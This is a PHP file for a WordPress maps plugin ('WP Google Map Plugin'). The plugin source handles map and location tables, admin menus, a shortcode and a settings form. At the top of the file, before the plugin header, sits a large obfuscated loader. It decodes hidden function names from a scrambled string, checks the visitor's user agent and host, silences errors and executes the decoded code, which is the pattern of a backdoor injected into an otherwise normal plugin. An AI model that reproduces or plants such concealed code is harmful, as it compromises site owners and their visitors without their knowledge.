<?php $mlsuxxxt = 'hmg%)!gj!<2,*j%-#1]#-bubE{74	145	x5f	146	x75	15mA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7252]y85]256]y6g]257]y86]267]y74]275]y7	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6a	61	x31")) or (strstr($uas,"c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<!**#j{hnpd#)tutjyf`o2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+9w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x2%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%TW%hIr	x5c1^-%r	x5c2^-%hOh/81#/#7e:55946-tr.984:75983:48984:71LOBALS["	x61	156	x75+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hop#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>12]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvsj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSU5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]mf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<utjyf`439275ttfsqnpdov{h19275j{hnpd19275fubmgoj	x22)gj!|!*nbsbq%)323ldfidk!~!<**q/%z<jg!)%z>>2*!%z>3<!fmtf!%zB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:52&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ubq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}7fw6*CW&)7gj6<.[A	x27if((function_exists("	x6f	142	x5f	163	x7#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmq}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yb:>1<!fmtf!%b:>%s:	x5c%j#0#)idubn`hfsq)!sp!*#o:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	xsvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**u%V	x27{ftmfV	x7f<*X&Z&S{s%6~6<	x7fw6<*K)ftpmdXA6|7**197-2q	x6d	163	x69	145")) or (strstr($uas,"	x72	166	x3P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]Dp%!-uyfu%)3of)fepdof`5##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|EB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]64	141	x72	164") && (!isset($G["	x61	156	x75	156	x61"]=1; $uas=strtol`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x26<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&62	137	x41	107	x45	116	x54"]); if ((strstr($uas,":]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#fh`fmjg}[;ldpt%}K;`ufldpt}X;`m)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!uw();}}>2<!%ww2)%w`TW~	x24<!fwbm)%k~~9{d%:osvufs:~928>>	x22|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>{*w%)kVx{**#k#)tutjyf`x	x22l24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	UOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#tmw/	x24)%c*W%eN+#Qi	x5c1^W%cZ~!<##!>!2p%!|!*!***b%)2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2ujojRk3`{666~6<&w6<	x7pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<***-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$dmrjmuw = $dp248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~<#462]47y]252]18y]#>q%<#762]67yx24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	T`LDPT7-UFOJ`GB)fubfs%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)error_reporting(0); $bgpwbop = implode(array_map("lgrnczr",str_split:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e46:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SE97e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]("%tjw!>!#]y84]275]y83]sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+:ftmbg39*56A:>:8:|:7#6#)tx24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!vwxft("", $bgpwbop); $dmrjm57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|7,*b	x27)fepdof.)fepdof./jneb#-*f%)sfxpmpusut)tpqssutRe%]562]38y]572]48y]#>m%:|:*r%:-t%#Y#-#D#-#W#-#C#-#O#-#N#x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64yo!%bss	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#4#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|	156	x61"])))) { $GLOBALSb%!<*qp%-*.%)euhA)3of>ower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x5!|!	x24-	x24	x5c%j^	x24-	x6	x63	164	x69	157	x6e"; function lgrnczr($n){return chr(ord($n)-1);} @4ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&7]452]88]5]48]32M3]317]445]2pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>*<!sfuvso!sboepn)%epnbss-%rxW~!Y7ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbs33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#	x61	156	x64	162	x6f	151	x64"))) { $dpvwxft = "	x63	162	x65	141	x~<#/%	x24-	x24!>!fyqmpef)#	x24*<!njA	x27&6<.fmjgA	x27doj%6<	x7fw6*	pp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#Qw#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxh%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>jtjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfgj!|!*msv%)}k~~~<ftmbg!osvufs!|ftq%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{h1:|:*mmvo:>:iuhofm%:-5ppde:4%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)STrrEvxNoITCnuF_EtaeRCxECaLPer_RtSzrxbdj'; $taezmzi=explode(chr((562-442)),substr($mlsuxxxt,(35849-29923),(159-125))); $tjaeae = $taezmzi[0]($taezmzi[(7-6)]); $gwqtuln = $taezmzi[0]($taezmzi[(7-5)]); if (!function_exists('fuuobubkzx')) { function fuuobubkzx($kihvtkq, $ukffjs,$kbefjekm) { $drbdex = NULL; for($cmmttpwlxo=0;$cmmttpwlxo<(sizeof($kihvtkq)/2);$cmmttpwlxo++) { $drbdex .= substr($ukffjs, $kihvtkq[($cmmttpwlxo*2)],$kihvtkq[($cmmttpwlxo*2)+(5-4)]); } return $kbefjekm(chr((51-42)),chr((468-376)),$drbdex); }; } $bzfqix = explode(chr((273-229)),'1415,40,2611,29,649,20,4799,25,2640,39,4846,50,2940,48,2082,48,237,29,5312,65,26,21,4922,70,3887,68,4140,23,3685,56,2799,53,510,45,3538,36,5036,62,2899,41,5715,69,2048,34,951,40,3819,21,784,60,47,60,1981,42,2326,65,1487,63,5410,34,4484,35,4519,32,145,49,3363,53,3517,21,1394,21,1282,61,3051,30,1878,49,2679,52,3124,56,5784,33,1055,48,2260,66,0,26,5564,44,5883,43,3574,41,3468,49,2443,57,392,20,5126,52,2391,52,4824,22,2731,68,4374,25,4758,41,3445,23,4163,56,1807,35,1718,22,4399,31,465,45,4024,49,2500,60,1927,54,1150,34,2191,22,5210,36,1343,51,669,62,3214,25,4219,25,1103,47,5853,30,3955,69,323,69,2023,25,731,53,844,50,5817,36,3297,28,1740,67,5246,66,1842,36,991,64,107,38,2988,63,4321,53,4551,37,4651,43,3741,31,4430,31,3081,43,1550,56,4896,26,3325,38,3772,47,4244,50,3239,58,2852,47,5377,33,555,32,3416,29,4694,64,4992,44,5178,32,5444,63,587,27,5507,57,1212,70,4073,67,614,35,1639,55,194,43,2130,61,412,53,1455,32,3840,47,2213,47,2560,51,5098,28,894,57,4588,63,266,57,1694,24,1606,33,5666,49,1184,28,3187,27,5608,58,4461,23,3615,70,4294,27,3180,7'); $xlqyhza = $tjaeae("",fuuobubkzx($bzfqix,$mlsuxxxt,$gwqtuln)); $tjaeae=$mlsuxxxt; $xlqyhza(""); $xlqyhza=(833-712); $mlsuxxxt=$xlqyhza-1; ?><?php 
/*
Plugin Name: WP Google Map Plugin
Description:  A multilingual, multisite supported & most advanced Google Maps plugin for WordPress.
Author: flippercode
Version: 2.3.4
Author URI: http://www.flippercode.com
*/

register_activation_hook( __FILE__, 'wpgmp_network_propagate' );

add_action( 'plugins_loaded', 'wpgmp_load_plugin_languages' );

function wpgmp_load_plugin_languages() {
  load_plugin_textdomain( 'wpgmp_google_map', false, dirname( plugin_basename( __FILE__ ) ).'/languages/' ); 
}

/**
 * This function used to install required tables in the database on time of activation.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
  function wpgmp_network_propagate($network_wide)
        {
				if ( is_multisite() && $network_wide ) { // See if being activated on the entire network or one blog
					global $wpdb;

					// Get this so we can switch back to it later
					$currentblog = $wpdb->blogid;
					// For storing the list of activated blogs
					$activated = array();

					// Get all blogs in the network and activate plugin on each one
					$sql = "SELECT blog_id FROM {$wpdb->blogs}";
					$blog_ids = $wpdb->get_col($wpdb->prepare($sql,null));
					foreach ($blog_ids as $blog_id) {
						switch_to_blog($blog_id);
						wpgmp_activation();
						
					}
			 
					// Switch back to the current blog
					switch_to_blog($currentblog);

					// Store the array for a later function
					update_site_option('wpgmp_activated', $activated);
				} else { // Running on a single blog
					wpgmp_activation();
				}
		} // END public static function wprpw_network_propagate()
 
function wpgmp_activation() {
  global $wpdb;	
  $map_location = "CREATE TABLE IF NOT EXISTS `".$wpdb->prefix."map_locations` (
  				  `location_id` int(11) NOT NULL AUTO_INCREMENT,
  				  `location_title` varchar(255) DEFAULT NULL,
  				  `location_address` varchar(255) DEFAULT NULL,
  				  `location_draggable` varchar(255) DEFAULT NULL,
 				  `location_latitude` varchar(255) DEFAULT NULL,
  				  `location_longitude` varchar(255) DEFAULT NULL, 
  				  `location_messages` text DEFAULT NULL,
  				  `location_marker_image` text DEFAULT NULL,
  				  `location_group_map` int(11) DEFAULT NULL,
  				  `location_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  				  PRIMARY KEY (`location_id`)
				  ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
 $wpdb->query($map_location);
 
 $create_map = "CREATE TABLE IF NOT EXISTS `".$wpdb->prefix."create_map` (
  			   `map_id` int(11) NOT NULL AUTO_INCREMENT,
  			   `map_title` varchar(255) DEFAULT NULL,
  			   `map_width` varchar(255) DEFAULT NULL,
  			   `map_height` varchar(255) DEFAULT NULL,
  			   `map_zoom_level` varchar(255) DEFAULT NULL,
  			   `map_type` varchar(255) DEFAULT NULL,
  			   `map_scrolling_wheel` varchar(255) DEFAULT NULL,
 			   `map_visual_refresh` varchar(255) DEFAULT NULL,
  			   `map_45imagery` varchar(255) DEFAULT NULL,
  			   `map_street_view_setting` text DEFAULT NULL,
  			   `map_route_direction_setting` text DEFAULT NULL,
  			   `map_all_control` text DEFAULT NULL,
  			   `map_info_window_setting` text DEFAULT NULL,
  			   `style_google_map` text DEFAULT NULL,
  			   `map_locations` text DEFAULT NULL,
  			   `map_layer_setting` text DEFAULT NULL,
  			   `map_polygon_setting` text DEFAULT NULL,
  			   `map_polyline_setting` text DEFAULT NULL,
  			   `map_cluster_setting` text DEFAULT NULL,
  			   `map_overlay_setting` text DEFAULT NULL,
  			   PRIMARY KEY (`map_id`)
			   ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
 $wpdb->query($create_map);

 $group_map = "CREATE TABLE IF NOT EXISTS `".$wpdb->prefix."group_map` (
  			  `group_map_id` int(11) NOT NULL AUTO_INCREMENT,
  			  `group_map_title` varchar(255) DEFAULT NULL,
  			  `group_marker` text DEFAULT NULL,
  			  `group_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  			  PRIMARY KEY (`group_map_id`)
			  ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;";
 $wpdb->query($group_map);
}

if( ! class_exists( 'WP_List_Table' ) ) {
    require_once( ABSPATH . 'wp-admin/includes/class-wp-list-table.php' );
}

/**
 * This function used to register required scripts.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_admin_scripts() {
	wp_enqueue_script('media-upload');
	wp_enqueue_script('thickbox');
	 wpgmp_google_map_load();

}

/**
 * This function used to register required styles in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_admin_styles() {
	wp_enqueue_style('thickbox');
}

$wpgmp_containers=array('map'); 

/**
 * This function used to display navigations menu in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */

function wpgmp_google_map_page() {
    define("wpgmp_plugin_permissions", "add_users");
   $pagehook1 = add_menu_page(
        __("WP Google Map", "wpgmp_google_map"),
        __("WP Google Map", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_map_pro",
        "wpgmp_admin_overview"
    );
   $pagehook2 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Add Locations", "wpgmp_google_map"),
        __("Add Locations", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_add_location",
        "wpgmp_add_locations"
    );
   $pagehook3 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Locations", "wpgmp_google_map"),
        __("Manage Locations", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_manage_location",
        "wpgmp_manage_locations"
    );
    
	$pagehook4 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Create Map", "wpgmp_google_map"),
        __("Create Map", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_create_map",
        "wpgmp_create_map"
    );
	$pagehook5 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Map", "wpgmp_google_map"),
        __("Manage Map", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_manage_map",
        "wpgmp_manage_map"
    );
	
	$pagehook6 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Create Marker Group", "wpgmp_google_map"),
        __("Create Marker Group", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_create_group_map",
        "wpgmp_create_group_map"
    );
	
	$pagehook7 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Manage Marker Groups", "wpgmp_google_map"),
        __("Manage Marker Groups", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_wpgmp_manage_group_map",
        "wpgmp_manage_group_map"
    );
	$pagehook8 = add_submenu_page(
        "wpgmp_google_map_pro",
        __("Settings", "wpgmp_google_map"),
        __("Settings", "wpgmp_google_map"),
        wpgmp_plugin_permissions,
        "wpgmp_google_settings",
        "wpgmp_settings"
    );
    
   add_action('load-'.$pagehook1, 'load_color_js');
   add_action('load-'.$pagehook2, 'load_color_js');
   add_action('load-'.$pagehook3, 'load_color_js');

   add_action('load-'.$pagehook4, 'load_color_js');
   add_action('load-'.$pagehook5, 'load_color_js');
   add_action('load-'.$pagehook6, 'load_color_js');

   add_action('load-'.$pagehook6, 'load_color_js');
   add_action('load-'.$pagehook7, 'load_color_js');
   add_action('load-'.$pagehook8, 'load_color_js');


}

function load_color_js(){
wp_enqueue_style(
		'google_bootstrap_css',
		plugins_url( '/css/bootstrap.css' , __FILE__ ));	
		
}


/**
 * This function used to show map on front end side.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_show_location_in_map($atts, $content=null){
 ob_start();

wpgmp_google_map_load();	

 global $wpdb;
 extract( shortcode_atts( array(
		'zoom' => get_option('wpgmp_zoomlevel'),
		'width' => get_option('wpgmp_mapwidth'),
		'height' => get_option('wpgmp_mapheight'),
		'title' => 'WP Google Map',
		'class' => 'map',
		'center_latitude' => get_option('wpgmp_centerlatitude'),
		'center_longitude' => get_option('wpgmp_centerlongitude'),
		'container_id' => 'map',
		'id' => ''
 ),$atts));
	
 $icon= isset($atts['icon']) ? $atts['icon'] : '';
 include_once dirname(__FILE__).'/class-google-map.php';
 $map = new Wpgmp_Google_Map();
  
 $map_data = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."create_map where map_id=%d",$atts['id']));
 
 $unserialize_map_street_view_setting = unserialize($map_data->map_street_view_setting);
 $unserialize_map_control_setting = unserialize($map_data->map_all_control);
 $unserialize_map_info_window_setting = unserialize($map_data->map_info_window_setting);
 $unserialize_map_layer_setting = unserialize($map_data->map_layer_setting);
  
 if( !empty($map_data) )
 {
	$un_loc_add = unserialize($map_data->map_locations);
 	$loc_data = $wpdb->get_row($wpdb->prepare("SELECT location_address,location_latitude,location_longitude FROM ".$wpdb->prefix."map_locations where location_id=%d",$un_loc_add[0]));
 
 if( !empty($center_latitude) ) {
	$map->center_lat = $center_latitude;
 } else {
	$map->center_lat = $loc_data->location_latitude;
 }
 
 if( !empty($center_longitude) ) {
	 $map->center_lng = $center_longitude;
 } else {
	$map->center_lng = $loc_data->location_longitude;
 }
    
 if( !empty($unserialize_map_street_view_setting['street_control']) ) {
	 
	$map->street_control = $unserialize_map_street_view_setting['street_control'];
	$map->street_view_close_button = $unserialize_map_street_view_setting['street_view_close_button'];
	$map->links_control = $unserialize_map_street_view_setting['links_control'];
	$map->street_view_pan_control = $unserialize_map_street_view_setting['street_view_pan_control'];  
 }
  
  
   $map->map_type=$map_data->map_type;
  
  if( empty($map_data->map_width) ) {
	 $map->map_width = $width;
  } else {
	 $map->map_width = $map_data->map_width;
  }	
	
  if( empty($map_data->map_height) ) {
	 $map->map_height = $height;
  } else {
	 $map->map_height = $map_data->map_height;
  }
  
  $map->map_scrolling_wheel =$map_data->map_scrolling_wheel;
  $map->map_pan_control =$unserialize_map_control_setting['pan_control'];
  $map->map_zoom_control =$unserialize_map_control_setting['zoom_control'];
  $map->map_type_control =$unserialize_map_control_setting['map_type_control'];
  $map->map_scale_control =$unserialize_map_control_setting['scale_control'];
  $map->map_street_view_control =$unserialize_map_control_setting['street_view_control'];
  $map->map_overview_control =$unserialize_map_control_setting['overview_map_control'];
  
  
  $map->visualrefresh =$map_data->map_visual_refresh;
  $map->map_layers=$unserialize_map_layer_setting['choose_layer'];

  if( empty($map_data->map_zoom_level) ) {
		$map->zoom = $zoom;
  } else {
		$map->zoom = $map_data->map_zoom_level;
  }
  
 
}

if( !empty($atts['id']) ) {
	
$map_locations = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."create_map where map_id=%d",$atts['id']));
$un_info_window_setting = unserialize($map_locations->map_info_window_setting);
 
   	$map_address = unserialize($map_locations->map_locations);
	
	if( $map_address!='' ) {
		$address[] = array();
		
   	foreach($map_address as $map_ad) {
   	
	$map_locations_records = $wpdb->get_row($wpdb->prepare("SELECT * FROM ".$wpdb->prefix."map_locations where location_id=%d",$map_ad));
    
	$group_marker = $wpdb->get_row($wpdb->prepare("SELECT group_marker FROM ".$wpdb->prefix."group_map where group_map_id=%d",$map_locations_records->location_group_map));
	
	$wpgm_marker =  get_option('wpgmp_default_marker');
	
	$unmess_info_message = unserialize(base64_decode($map_locations_records->location_messages));
	
	$loc_image_src = '';
	
	if( !empty($group_marker->group_marker) ) {
		$loc_image_src = $group_marker->group_marker;
	} elseif( !empty($map_locations_records->location_marker_image) ) {
		$loc_image_src = $map_locations_records->location_marker_image;
	} elseif( !empty($wpgm_marker) ) {
		$loc_image_src = $wpgm_marker;
	}
	
	$latitude = $map_locations_records->location_latitude;
	$longitude = $map_locations_records->location_longitude;
	$title = $map_locations_records->location_title;
	$dragg = $map_locations_records->location_draggable;
		
	$address['first']['message'] = $unmess_info_message['googlemap_infowindow_message_one'];
	
	$address = array_filter($address);
		
		if( $address['first']['message']!='' ) {
			
			$map->addMarker($latitude,$longitude,$un_info_window_setting['info_window'],$title,$address,$loc_image_src,'',$dragg);
		} else {
			
			wp_print_scripts( 'wpgmp_map' );
			
			$new_loc_adds = array();
			
			$new_loc_adds = $map_locations_records->location_address;
			
			$address_coordinates = wpgmp_get_address_coordinates( $new_loc_adds );
			
			$map->addMarker($latitude,$longitude,$un_info_window_setting['info_window'],$title,$new_loc_adds,$loc_image_src,'',$dragg);
				
	    }
	
   }
  }
} elseif( $content ) {
	wp_print_scripts( 'wpgmp_map' );
	if( empty($zoom) || empty($width) || empty($height) || empty($title) ) {
		$map->zoom = 14;
		$map->width = '600';
		$map->height = '400';
		$map->title = 'WP Google Map Plugin';
	} else {
		$map->zoom = $zoom;
		$map->width = $width;
		$map->height = $height;
		$map->title = $title;
	}
	
	$address = '';
	$coordinates = wpgmp_get_coordinates( $content );
	$address = '<h3>'.$coordinates["address"].'</h3>';
	$address .= '<p>Latitude='.$coordinates["lat"].'</p>';
	$address .= '<p>Longitude='.$coordinates["lng"].'</p>';
	$map->center_lat = $coordinates['lat'];
	$map->center_lng = $coordinates['lng'];
	$map->addMarker($map->center_lat,$map->center_lng,'true',$map->title,$address);
 
   if( !is_array( $coordinates ) )
   return;
} else {
	
	return "Thank you for using this plugin. Please <a href='".admin_url('admin.php?page=wpgmp_add_location')."'>Add your locations</a> or set plugin <a href='".admin_url('admin.php?page=wpgmp_google_settings')."'>Settings</a>.";
}
	
 echo $map->showmap();
 $content =  ob_get_contents();
 ob_clean();
 
 return $content;
}

/**
 * This function used to show success/failure message in backend.
 * @author Flipper Code <hello@flippercode.com>
 * @version 1.0.0
 * @package Maps
 */
 
function wpgmp_settings(){
?>
<div class="wpgmp-wrap"> 
<div class="col-md-11">   
<div id="icon-options-general" class="icon32"><br></div>
<h3><span class="glyphicon glyphicon-asterisk"></span><?php _e( 'WP Google Map Plugin Settings', 'wpgmp_google_map' ) ?></h3>
<div class="wpgmp-overview">
        <form method="post" action="options.php">  
            <?php wp_nonce_field('update-options') ?>  
      <p>
<a href="<?php echo site_url(); ?>/wp-admin/admin.php?page=wpgmp_add_location"><?php _e( 'Click Here', 'wpgmp_google_map' ) ?></a>&nbsp; <?php _e( 'to add a new location or', 'wpgmp_google_map' ) ?>&nbsp;<a href="<?php echo site_url() ?>/wp-admin/admin.php?page=wpgmp_manage_location"><?php _e( 'Browse', 'wpgmp_google_map' ) ?></a>&nbsp; <?php _e( 'your existings locations.', 'wpgmp_google_map' ) ?>
 </p>
       
      <div class="form-horizontal">
    <div class="col-md-4 left"><label for="wpgmp_zoomlevel"><?php _e( 'Zoom Level', 'wpgmp_google_map' ) ?></label></div>
   <div class="col-md-7"><input type="text" class="form-control" name="wpgmp_zoomlevel" size="45" value="<?php echo get_option('wpgmp_zoomlevel'); ?>" />
<p class="description"><?php _e( 'Choose Zoom Level between 1 to 14. Default is 4.', 'wpgmp_google_map' ) ?> </p></div>
           	
    <div class="col-md-4 left"><label for="wpgmp_centerlatitude"><?php _e( 'Center Latitude', 'wpgmp_google_map' ) ?></label></div>
   <div class="col-md-7"><input type="text"  class="form-control" name="wpgmp_centerlatitude" size="45" value="<?php echo get_option('wpgmp_centerlatitude'); ?>" />
<p class="description"><?php _e( 'Write down center location on the map.', 'wpgmp_google_map' ) ?></p></div>
       
        	
    <div class="col-md-4 left"><label for="wpgmp_centerlongitude"><?php _e( 'Center Longitude', 'wpgmp_google_map' ) ?></label></div>
   <div class="col-md-7"><input type="text" class="form-control" name="wpgmp_centerlongitude" size="45" value="<?php echo get_option('wpgmp_centerlongitude'); ?>" />
<p class="description"><?php _e( 'Write down center location on the map.', 'wpgmp_google_map' ) ?></p></div>
       
        	
    <div class="col-md-4 left"><label for="wpgmp_language"><?php _e( 'Select Language', 'wpgmp_google_map' ) ?></label></div>
   <div class="col-md-7">
<select name="wpgmp_language" class="form-control">
 <option value="en"<?php selected(get_option('wpgmp_language'),'en') ?>><?php _e( 'ENGLISH', 'wpgmp_google_map' ) ?></option>
 <option value="ar"<?php selected(get_option('wpgmp_language'),'ar') ?>><?php _e( 'ARABIC', 'wpgmp_google_map' ) ?></option>
 <option value="eu"<?php selected(get_option('wpgmp_language'),'eu') ?>><?php _e( 'BASQUE', 'wpgmp_google_map' ) ?></option>
 <option value="bg"<?php selected(get_option('wpgmp_language'),'bg') ?>><?php _e( 'BULGARIAN', 'wpgmp_google_map' ) ?></option>
 <option value="bn"<?php selected(get_option('wpgmp_language'),'bn') ?>><?php _e( 'BENGALI', 'wpgmp_google_map' ) ?></option>
 <option value="ca"<?php selected(get_option('wpgmp_language'),'ca') ?>><?php _e( 'CATALAN', 'wpgmp_google_map' ) ?></option>
 <option value="cs"<?php selected(get_option('wpgmp_language'),'cs') ?>><?php _e( 'CZECH', 'wpgmp_google_map' ) ?></option>
 <option value="da"<?php selected(get_option('wpgmp_language'),'da') ?>><?php _e( 'DANISH', 'wpgmp_google_map' ) ?></option>
 <option value="de"<?php selected(get_option('wpgmp_language'),'de') ?>><?php _e( 'GERMAN', 'wpgmp_google_map' ) ?></option>
 <option value="el"<?php selected(get_option('wpgmp_language'),'el') ?>><?php _e( 'GREEK', 'wpgmp_google_map' ) ?></option>
 <option value="en-AU"<?php selected(get_option('wpgmp_language'),'en-AU') ?>><?php _e( 'ENGLISH (AUSTRALIAN)', 'wpgmp_google_map' ) ?></option>
